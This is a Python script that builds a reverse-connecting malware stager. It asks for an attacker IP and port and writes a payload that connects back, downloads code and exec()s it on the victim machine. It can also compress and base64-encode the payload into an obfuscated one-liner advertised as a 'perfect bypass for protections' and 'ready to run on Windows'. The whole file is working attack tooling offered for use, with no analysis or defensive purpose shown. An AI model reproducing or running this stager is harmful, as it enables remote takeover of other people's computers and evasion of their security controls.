import base64
import zlib

# Banner with MR JOKAR
banner = """
\033[1;31m


███╗   ███╗██████╗      ██╗ ██████╗ ██╗  ██╗ █████╗ ██████╗ 
████╗ ████║██╔══██╗     ██║██╔═══██╗██║ ██╔╝██╔══██╗██╔══██╗
██╔████╔██║██████╔╝     ██║██║   ██║█████╔╝ ███████║██████╔╝ ----> Perfect bypass for protections
██║╚██╔╝██║██╔══██╗██   ██║██║   ██║██╔═██╗ ██╔══██║██╔══██╗
██║ ╚═╝ ██║██║  ██║╚█████╔╝╚██████╔╝██║  ██╗██║  ██║██║  ██║
╚═╝     ╚═╝╚═╝  ╚═╝ ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
                                                            

\033[1;37m
"""

print(banner)

# Get user input for IP, Port, and Output file name
ip = input("Enter Your IP address: ").strip()
port = input("Enter Your Port: ").strip()

output_filename = input("Enter output file name (e.g., payl-enc.py): ").strip()

# Template code for generating the payload
template_code = '''
import socket, zlib, base64, struct, time
import random as r

def f1(): return socket.socket(2, socket.SOCK_STREAM)
def f2(s, ip, port): s.connect((ip, port))
def f3(): return struct.unpack('>I', s.recv(4))[0]
def f4(s, l): return s.recv(l)

for x in range(r.randint(5, 20)):
    try:
        s = f1()
        f2(s, '{IP}', {PORT})
        break
    except:
        time.sleep(r.uniform(3, 7))

l = f3()
d = f4(s, l)
while len(d) < l:
    d += f4(s, l - len(d))

exec(zlib.decompress(base64.b64decode(d)), {'s': s})
'''

# Replace IP and port in the template
payload_code = template_code.replace('{IP}', ip).replace('{PORT}', port)

# Save raw payload
with open(output_filename, "w", encoding="utf-8") as f:
    f.write(payload_code)

print(f"✅ File '{output_filename}' created successfully.")

# Ask for encoding option
choice = input("Do you want to encode the script to Base64 and compress it? (yes/no): ").strip().lower()
if choice == "yes":
    # Compress then encode
    compressed = zlib.compress(payload_code.encode('utf-8'))
    encoded = base64.b64encode(compressed).decode('utf-8')

    # Build the final payload
    one_liner = f"exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('{encoded}')[0])))"

    # Save to done-full.py
    with open("done-full.py", "w", encoding="utf-8") as f:
        f.write(one_liner)

    print("✅ File 'done-full.py' created and ready to run on Windows.")
else:
    print("Encoding skipped.")
